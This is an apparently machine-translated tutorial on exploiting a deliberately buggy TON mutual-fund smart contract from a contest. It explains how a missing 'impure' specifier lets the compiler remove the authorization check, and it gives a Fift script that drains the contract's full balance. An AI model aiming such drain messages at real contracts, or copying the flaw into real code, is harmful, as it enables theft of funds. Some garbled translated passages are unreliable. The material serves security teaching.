# How to hack simple smart contract in the TON blockchain

![hack smart contract for TON](./img/1.jpg)

## Introduction

In this article, we will analyze the hacking of a simple smart contract in the TON network. Don’t worry if you don’t know what TON is or how to write smart contracts, this article will be both a short analysis for the “pros of smart contract development” and a detailed analysis for beginners.

### What is TON?

TON is a decentralized support developed in this area, developed by the Telegram team, in 2019 the Telegram team received a ban from the American Securities Commission to issue their cryptocurrency, which made the continuation of work on protection incredible, but TON was "transferred" to an independent community of participants The Open Network, which is currently observed. It boasts super-fast transactions, ranking wins, collection app boosts, and eco-logicality.

![TON](./img/2.jpg)

The TON technical network is a network of virtual machines [TVM] (https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview). TVM also allows you to execute some code. Application developers load programs into the TVM framework. Expected programs on the network are dropped by smart contracts.

In the present, we will analyze a simple smart contract that allows you to provide users with mutual funding to manage their funds.

### Acting model

The actor model is a mathematical model of computed calculations that underlies TON smart contracts. In it, each smart contract can receive one message, change the state, or send one or more messages per unit of time. It is worth noting that smart contracts have their own balance.

### What is hacking in production

Since the smart contracts in the actor model "communicate" via messages, a hack, if it occurs, is a message that will output all media with the balance of the smart contract to the reach address.

### FunC and Fift

TON smart contracts guarantee the stable operation of the TON vehicle. For the development of smart contracts, there is a low-level Fift language, as well as a high-level FunC.

TON often holds various contests for competitions, contracts and hacks, which we will analyze, just with one of these contests.

> If you want to get acquainted with TON, then I offer a free lesson and an exciting game on github, you can watch them at [link](https://github.com/romanovichim/TonFunClessons_eng).

### How the analysis is built

First, let's take a quick look at the smart contract and get excited. If you don't know what's going on in the TON network, you can start right away with a detailed breakdown.

## Quick analysis

Before we analyze how to hack a contract, let's break it down.

### Parsing the smart contract

A smart contract implements the following logic:

The contract is a very simplified mutual fund, for two people, it allows them to manage the balance of the contract by sending messages to the contract.

> In the TON actor model of smart contracts, each smart contract can receive one message, change its own state, or send one or more messages per unit of time, thus interaction occurs through messages.

![Smart contract](./img/3.jpg)

In its storage, the contract stores two addresses, when sending a message, the contract checks that the message was sent from exactly one of these addresses (some kind of authorization) and then puts the message body in register c5 (output action register), thus allowing you to manage the means of smart contract.

Smart contract code:


	{-

	  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
	  Contract contains intentional bugs, do not use in production

	-}


	#include "stdlib.func";

	;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;

	() execute (cell) impure asm "c5 POPCTR";

	global slice addr1;
	global slice addr2;

	() load_data () impure {
	  slice ds = get_data().begin_parse();
	  addr1 = ds~load_msg_addr();
	  addr2 = ds~load_msg_addr();
	}

	() authorize (sender) inline {
	  throw_unless(187, equal_slice_bits(sender, addr1) | equal_slice_bits(sender, addr2));
	}

	() recv_internal (in_msg_full, in_msg_body) {
		if (in_msg_body.slice_empty?()) { ;; ignore empty messages
			return ();
		}
		slice cs = in_msg_full.begin_parse();
		int flags = cs~load_uint(4);

		if (flags & 1) { ;; ignore all bounced messages
			return ();
		}
		slice sender_address = cs~load_msg_addr();

		load_data();
		authorize(sender_address);

		cell request = in_msg_body~load_ref();
		execute(request);
	}

Let's go through the code, at the beginning of the smart contract we write an auxiliary function for working with the storage of the smart contract, the `load_data()` function will load two addresses from `c4` into the global variables `addr1`, `addr2`. It is assumed that the logic of the smart contract can only be "launched" from these addresses.

	#include "stdlib.func";

		;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;

		global slice addr1;
		global slice addr2;

		() load_data () impure {
		  slice ds = get_data().begin_parse();
		  addr1 = ds~load_msg_addr();
		  addr2 = ds~load_msg_addr();
		}

Next comes the `recv_internal()` method, which at the very beginning, checks that the message is not empty, skips the message flags, and extracts the sender's address from the message:

	() recv_internal (in_msg_full, in_msg_body) {
		if (in_msg_body.slice_empty?()) { ;; ignore empty messages
			return ();
		}
		slice cs = in_msg_full.begin_parse();
		int flags = cs~load_uint(4);

		if (flags & 1) { ;; ignore all bounced messages
			return ();
		}
		slice sender_address = cs~load_msg_addr();

	}

Next, we get the addresses from the storage and check that the address of the sender of the message in the smart contract matches one of the addresses from the storage.

	() authorize (sender) inline {
	  throw_unless(187, equal_slice_bits(sender, addr1) | equal_slice_bits(sender, addr2));
	}

	() recv_internal (in_msg_full, in_msg_body) {
		if (in_msg_body.slice_empty?()) { ;; ignore empty messages
			return ();
		}
		slice cs = in_msg_full.begin_parse();
		int flags = cs~load_uint(4);

		if (flags & 1) { ;; ignore all bounced messages
			return ();
		}
		slice sender_address = cs~load_msg_addr();

		load_data();
		authorize(sender_address);

		}
	
It is here that the vulnerability is located, the absence of the `impure` specifier in the `authorize()` function will lead to its removal by the compiler, since according to the documentation:

The `impure` specifier means that the function may have some side effects that should not be ignored. For example, we must specify an impure specifier if the function can modify the contract store, send messages, or throw an exception when some data is invalid and the function is meant to validate that data.

If `impure` is not specified and the result of a function call is not used, then the FunC compiler can and will remove that function call.

At the end of the smart contract, the message body is written to the output action register `c5`. Thus, for hacking, we just need to send a message there, which will display the Toncoin crypto currency from the smart contract.

	() execute (cell) impure asm "c5 POPCTR";
	
	() recv_internal (in_msg_full, in_msg_body) {
		if (in_msg_body.slice_empty?()) { ;; ignore empty messages
			return ();
		}
		slice cs = in_msg_full.begin_parse();
		int flags = cs~load_uint(4);

		if (flags & 1) { ;; ignore all bounced messages
			return ();
		}
		slice sender_address = cs~load_msg_addr();

		load_data();
		authorize(sender_address);

		cell request = in_msg_body~load_ref();
		execute(request);
	}

### Parse message for hacking

To send a message, we need to write a fift script (which will give us a bag of cells structure that we will send to the TON network), let's start with the message body, for this we need `<b b>`

	"TonUtil.fif" include
	<b  b> =: message

According to the documentation, the message itself may look like this (further code in FunC):

	  var msg = begin_cell()
		.store_uint(0x18, 6)
		.store_slice(addr)
		.store_coins(amount)
		.store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
		.store_slice(message_body)
	  .end_cell();

Therefore, we write in the body, the address to which we want to withdraw Toncoin, denote the amount as 0 Gram, we will not write anything in the body, we get:

	"TonUtil.fif" include
	<b 0x18 6 u, 0 your address Addr, 0 Gram, 0 1 4 + 4 + 64 + 32 + 1 + 1 + u, b> =: message

But in the register `c5` it will be necessary to put not a message, but an action necessary for this message. We will send the message using `SENDRAWMSG`.

But first, let's figure out how to store data in the `c5` register. Here [here](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=result-of-tvm-execution) the documentation says that this is a cell, with a link to the previous action , and with the last action. We don't have a previous action, so there will be an empty `Builder`.

	<b <b b> ref, здесь будет отправка сообщения ref, b>

> ref - adds a reference to Cell c to Builder b.

Go to `SENDRAWMSG`, take the "code" of the function from [371 lines here, directly from the block](https://github.com/ton-blockchain/ton/blob/d01bcee5d429237340c7a72c4b0ad55ada01fcc3/crypto/block/block.tlb) and see , according to [TVM documentation on page 137](https://ton-blockchain.github.io/docs/tvm.pdf), which parameters should be collected:

- function "code": 0x0ec3c86d 32 u
- message sending mode, in our case 128, because we want to withdraw all funds 128 8 u
- and the message message

> x u - bitness uint x

We get:

 	<b <b b> ref, 0x0ec3c86d 32 u, 128 8 u, message ref, b>
 
Now we wrap it all in one builder, because. we need a cell for the message:

	"TonUtil.fif" include
	<b 0x18 6 u, 0 your address Addr, 0 Gram, 0 1 4 + 4 + 64 + 32 + 1 + 1 + u, b> =: message

	<b <b <b b> ref, 0x0ec3c86d 32 u, 128 8 u, message ref, b> ref, b>

### How to send a message?

TON has several convenient options for sending `internal` messages, the first one is sending via [toncli](https://github.com/disintar/toncli):

> toncli - handy command line interface

1) First we collect the fift script, which we have already done
2) Use the `toncli send` command

Tutorial with pictures) [here](https://github.com/disintar/toncli/blob/master/docs/advanced/send_fift_internal.md).

The second, convenient option is the Go library tonutils-go, how to send a message using tonutils-go, is in one of my [previous lessons](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/14lesson/wallet_eng.md).

## Detailed analysis

### Parsing the mutual fund contract code

#### Smart contract storage

Let's start parsing the code with the "storage" of the smart contract, the storage of permanent data of the smart contract in the TON network is the c4 register.

> For more information about registers, see [here](https://ton-blockchain.github.io/docs/tvm.pdf) in paragraph 1.3

For convenience, we will write a comment what we will store in the contract, and we will store two addresses (`addr1` and `addr2`):

	;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;

> ;; two semicolons single line comment syntax
 
##### Helper function framework
 
For the convenience of working with the storage, we will write an auxiliary function that will unload data, first we declare it:

	() load_data () impure {

	}

> `impure` is a keyword that indicates that the function changes the smart contract data. We must specify the `impure` specifier if the function can modify the contract store, send messages, or throw an exception when some data is invalid and the function is intended to validate that data. **Important**: If impure is not specified and the result of a function call is not used, then the FunC compiler may remove that function call.

##### Global variables and data types

The addresses in this smart contract are supposed to be stored in global variables of the `slice` type. There are 4 main types in TON:

In our simple smart contract, we will use only four types:

- Cell (cell) - TVM cell, consisting of 1023 bits of data and up to 4 links to other cells
- Slice (slice) - A partial representation of the TVM cell used to parse data from the cell
- Builder - Partially built cell containing up to 1023 bits of data and up to four links; can be used to create new cells
- Integer - signed 257-bit integer

More about types in FunC:
[briefly here](https://ton-blockchain.github.io/docs/#/smart-contracts/)
[deployed here in section 2.1](https://ton-blockchain.github.io/docs/fiftbase.pdf)

In simple terms, cell is a sealed cell, slice is when the cell can be read, and builder is when you assemble the cell.

To make a variable [global](https://ton-blockchain.github.io/docs/#/func/global_variables?id=global-variables) you need to add the `global` keyword.

Let's declare two addresses of type `slice`:

	global slice addr1;
	global slice addr2;

	() load_data () impure {

	}

Now in the auxiliary function we will get the addresses from the register and pass them to the global variables.

##### Data storage in TON or register c4

In order to "get" data from c4, we need two functions from the [FunC standard library](https://ton-blockchain.github.io/docs/#/func/stdlib) .

Namely:
`get_data` - Gets a cell from the c4 register.
`begin_parse` - converts a cell into a slice

Let's pass this value to slice ds:

	global slice addr1;
	global slice addr2;

	() load_data () impure {
	  slice ds = get_data().begin_parse();

	}

##### Uploading the address

Load from the ds address with `load_msg_addr()` - which loads from the slice the only prefix that is a valid MsgAddress. We have two of them, so we 'unload' two times.

> `load_msg_addr()` is a function of the standard library, so don't forget to add the library itself using the [include](https://ton-blockchain.github.io/docs/#/func/compiler_directives?id=include) directive

	#include "stdlib.func";

	;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;

	global slice addr1;
	global slice addr2;

	() load_data () impure {
	  slice ds = get_data().begin_parse();
	  addr1 = ds~load_msg_addr();
	  addr2 = ds~load_msg_addr();
	}
	
#### "Body" of the smart contract

In order for a smart contract to implement any logic, it must have methods that can be accessed.

##### Reserved Methods

Smart contracts on the TON network have two reserved methods that can be accessed.

First, `recv_external()` this function is executed when a request to the contract comes from the outside world, that is, not from TON, for example, when we ourselves form a message and send it through lite-client (About installing lite-client). Second, `recv_internal()` this function is executed when inside TON itself, for example, when any contract refers to ours.

A lite-client is software that connects to full nodes to interact with the blockchain. They help users access and interact with the blockchain without the need to synchronize the entire blockchain.

This smart contract uses `recv_internal()`:

	() recv_internal (in_msg_full, in_msg_body) {

	}
	
Here the question should arise, what kind of `in_msg_full`, `in_msg_body`.
According to the documentation of the [TON virtual machine - TVM](https://ton-blockchain.github.io/docs/tvm.pdf), when an event occurs on an account in one of the TON chains, it triggers a transaction.

Each transaction consists of up to 5 stages. More details [here](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=transactions-and-phases).

We are interested in **Compute phase**. And to be more specific, what is "on the stack" during initialization. For normal post-triggered transactions, the initial state of the stack looks like this:

5 elements:
- Smart contract balance (in nanoTons)
- Incoming message balance (in nanotones)
- Cell with incoming message
- Incoming message body, slice type
- Function selector (for recv_internal it is 0)

In the logic of this smart contract, we do not need a balance, etc., therefore, `in_msg_full`, `in_msg_body`, the cell with the incoming message and the body of the incoming message are written as arguments.

##### Filling the method - checking for empty messages

The first thing we do inside `recv_internal()` is to drop the processing of empty messages. Let's check using `slice_empty()` (function of the standard library, [link to the description in the documentation](https://ton-blockchain.github.io/docs/#/func/stdlib?id=slice_empty)) and finish the smart -contract in case of an empty message with `return()`.

	() recv_internal (in_msg_full, in_msg_body) {
		if (in_msg_body.slice_empty?()) { ;; ignore empty messages
			return ();
		}
	}

The next step is to take the address from the full message, but the message needs to be parsed before we "get to the address".

In order for us to take the address, we need to convert the cell into a slice using `begin_parse`:

	slice cs = in_msg_full.begin_parse();

#####  Вычитываем сообщение - пропускаем флаги

Now we need to "subtract" the resulting slice to the address. Using the `load_uint` function from the [FunC standard library](https://ton-blockchain.github.io/docs/#/func/stdlib) it loads an unsigned n-bit integer from the slice, "subtract" the flags.

	int flags = cs~load_uint(4);

In this lesson, we will not dwell on the flags in detail, but you can read more in paragraph [3.1.7](https://ton-blockchain.github.io/docs/tblkch.pdf).

After receiving the flags, we will ignore the bounced messages that are not of interest to us:

	() recv_internal (in_msg_full, in_msg_body) {
		if (in_msg_body.slice_empty?()) { ;; ignore empty messages
			return ();
		}
		slice cs = in_msg_full.begin_parse();
		int flags = cs~load_uint(4);

		if (flags & 1) { ;; ignore all bounced messages
			return ();
		}
	}
	
##### Get the sender's address

Finally, we can take the sender address from the message, take it with the help of the already familiar `load_msg_addr()` and immediately use the helper function that we wrote earlier to load addresses from the `c4` register:

	() recv_internal (in_msg_full, in_msg_body) {
		if (in_msg_body.slice_empty?()) { ;; ignore empty messages
			return ();
		}
		slice cs = in_msg_full.begin_parse();
		int flags = cs~load_uint(4);

		if (flags & 1) { ;; ignore all bounced messages
			return ();
		}
		slice sender_address = cs~load_msg_addr();

		load_data();

	}
	

##### "Authorization"

Now, before moving on to the logic of the smart contract, it would be good to check that the sender address is either the first or the second address from the storage, i.e. we will make sure that further logic is executed only by the owners of the smart contract. To do this, we will make an auxiliary function `authorize()`:

	() authorize (sender) inline {

	}

The `inline` specifier puts the body of the function directly into the code of the parent function.

If a message is received that is not from our two addresses, we will throw an exception and finish the execution of the smart contract. For this, we will use [built-ins](https://ton-blockchain.github.io/docs/#/func/builtins) exceptions.

##### Exceptions

Exceptions can be thrown by the conditional primitives `throw_if` and `throw_unless` and the unconditional `throw`.

Let's use `throw_if` and pass any error code.

	() authorize (sender) inline {
	  throw_unless(187, equal_slice_bits(sender, addr1) | equal_slice_bits(sender, addr2));
	}
	
> `equal_slice_bit` - standard library function, checks for equality

##### The same mistake that allows you to hack the contract

B seems to be everything, but this is where the error lies, which allows you to hack the smart contract - this function will be removed during compilation, since it lacks the `impure` specifier

According to the documentation:

The `impure` specifier means that the function may have some side effects that should not be ignored. For example, we must specify the `impure` specifier if the function can modify the contract store, send messages, or throw an exception when some data is invalid and the function is intended to validate that data.

If `impure` is not specified and the result of a function call is not used, then the FunC compiler can and will remove that function call.

That is why this contract is vulnerable - authorization will simply disappear during compilation.

##### Contract logic

Despite the vulnerability found, let's analyze the contract to the end: we will get the cell with the request from the message body:

	cell request = in_msg_body~load_ref();

> load_ref() - loads the first link from the slice.

The last piece remains, the `execute()` function:

	() recv_internal (in_msg_full, in_msg_body) {
		if (in_msg_body.slice_empty?()) { ;; ignore empty messages
			return ();
		}
		slice cs = in_msg_full.begin_parse();
		int flags = cs~load_uint(4);

		if (flags & 1) { ;; ignore all bounced messages
			return ();
		}
		slice sender_address = cs~load_msg_addr();

		load_data();
		authorize(sender_address);

		cell request = in_msg_body~load_ref();
		execute(request);
	}
	
##### Fill register c5

FunC supports function definition in assembler (meaning Fift). This happens as follows - we define a function as a low-level TVM primitive. In our case:

	() execute (cell) impure asm "c5 POPCTR";

As you can see, the `asm` keyword is used

POPCTR c(i) - pops the value of x from the stack and stores it in the control register c(i),

You can see the list of possible primitives from page 77 in [TVM](https://ton-blockchain.github.io/docs/tvm.pdf).

##### Register c5

Register `c5` contains output actions. Accordingly, we can put a message here that will display the funds.

## Conclusion

I write similar tutorials and analyzes on the TON network in my channel - https://t.me/ton_learn . I will be glad to your subscription.


